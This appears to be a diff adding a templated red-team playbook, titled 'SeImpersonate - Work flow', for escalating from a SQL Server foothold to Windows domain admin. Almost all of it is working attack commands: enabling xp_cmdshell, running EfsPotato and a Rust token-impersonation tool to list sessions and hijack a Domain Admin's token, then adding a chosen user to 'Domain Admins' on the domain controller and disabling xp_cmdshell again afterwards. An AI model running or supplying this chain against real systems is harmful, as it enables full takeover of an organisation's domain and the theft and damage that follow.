@@ -1,0 +1,39 @@
+:: SeImpersonate - Work flow ::
+:: Usage: 
+:: 1) Get and replace values for variables
+:: 2) List sessions on host
+:: 3) Fill PID structure
+:: 4) Execute and get DA
+
+@@PATH_TO_RUST_TOKEN_IMPERSONATION_SCRIPT@@
+@@PATH_TO_PS_INVOKE_CMD_ADD_AS_DA_SCRIPT@@
+@@PATH_TO_EFS_POTATO@@
+@@DC_NAME@@
+@@USER_TO_BE_ELEVATED@@
+@@LOG_FILE_DIR@@
+@@PID_OF_DA@@
+
+
+-- 1: Get list of active sessions
+-- Configure xp_cmdshell: enable
+EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+
+-- List users sessions on system
+EXEC master..xp_cmdshell '@@PATH_TO_EFS_POTATO@@ -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "@@PATH_TO_RUST_TOKEN_IMPERSONATION_SCRIPT@@ list | Set-Content @@LOG_FILE_DIR@@\token_list_users_sessions.log"'
+
+-- Configure xp_cmdshell: disable
+EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE; EXEC sp_configure 'Show Advanced Options', 0; RECONFIGURE;
+
+
+-- 2: Use sessions to get DA
+-- 2.a: Contents of PeScript @ "@@PATH_TO_PS_INVOKE_CMD_ADD_AS_DA_SCRIPT@@"
+C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -c "Invoke-Command -ComputerName @@DC_NAME@@ -ScriptBlock {Add-ADGroupMember -Identity 'Domain Admins' -Members @@USER_TO_BE_ELEVATED@@} "
+
+-- 2.b: Execute PE script as DA - manyally replace "@@PID_OF_DA@@"
+-- Configure xp_cmdshell: enable
+EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+-- Get DA
+EXEC master..xp_cmdshell '@@PATH_TO_EFS_POTATO@@ -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "@@PATH_TO_RUST_TOKEN_IMPERSONATION_SCRIPT@@ exec -p @@PID_OF_DA@@ -c @@PATH_TO_PS_INVOKE_CMD_ADD_AS_DA_SCRIPT@@ " '
+
+-- Configure xp_cmdshell: disable
+EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE; EXEC sp_configure 'Show Advanced Options', 0; RECONFIGURE;
